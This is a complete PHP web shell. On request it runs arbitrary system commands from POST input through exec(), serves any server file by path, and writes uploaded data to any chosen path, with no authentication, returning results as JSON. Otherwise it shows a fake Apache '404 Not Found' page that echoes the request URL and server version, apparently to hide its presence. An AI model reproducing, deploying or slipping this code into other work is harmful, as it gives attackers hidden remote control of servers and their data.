<?php

function run($cmd) {
    /* 
    Function wraps execution of system commands
    Returns corresponding verbose output of command
    */
    exec($cmd . " 2>&1", $output, $ret_code);
    if (isset($ret_code)) {
        if ($ret_code !== 0) {
            return array(
                'stderr' => implode("\n", $output), 
            );
        }
        elseif ($ret_code == 0 && empty($output)) {
            return array(
                'stdout' => "No output", 
            );
        }
        else {
            return array(
                'stdout' => implode("\n", $output), 
            );
        }
    }
}


function put_file($path) {
    /* 
    Function gets a file from a PUT request, and drops it on $path
    Can handle large file uploads 
    */
    $putdata = fopen("php://input", "r");
    $fp = fopen($path, "w");

    if ($fp === FALSE) {
        return array(
            'stderr' => "Could not create file $path",
        );
    }
    else {
        /* Read the data 1 KB at a time and write to the file */
        while ($data = fread($putdata, 1024))
            fwrite($fp, $data);

        /* Close the streams */
        fclose($fp);
        fclose($putdata);

        return array(
            'stdout' => 'Done',
        );  
    }

}

function get_file($path) {
    /* 
    Function serves file from the server, by chunks of 8KB
    Can handle large file servings 
    */
    if (file_exists($path)) {
        header("Content-Length:".filesize($path));
        
        set_time_limit(0);
        $file = @fopen($path,"rb");
        while(!feof($file))
        {
            print(@fread($file, 1024*8));
            ob_flush();
            flush();
        }
        die();
    } else {
        http_response_code(404);
        die();  
    }   
}

if (isset($_REQUEST["type"])) {
    switch ($_REQUEST["type"]) {
        case 'cmd':
            $output = run($_POST["id"]);
            break;
        case 'getfile':
            $output = get_file($_POST["id"]);
            break;
        case 'putfile':
            $output = put_file($_GET["id"]);
            break;
        default:
            break;
    }

    header("Content-Type: application/json");
    echo json_encode($output);
    die();
}

echo "<!DOCTYPE html>
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL ". $_SERVER['REQUEST_URI'] ." was not found on this server.</p>
<hr>
<address>" . @apache_get_version() . "</address>

</body></html>"

?>
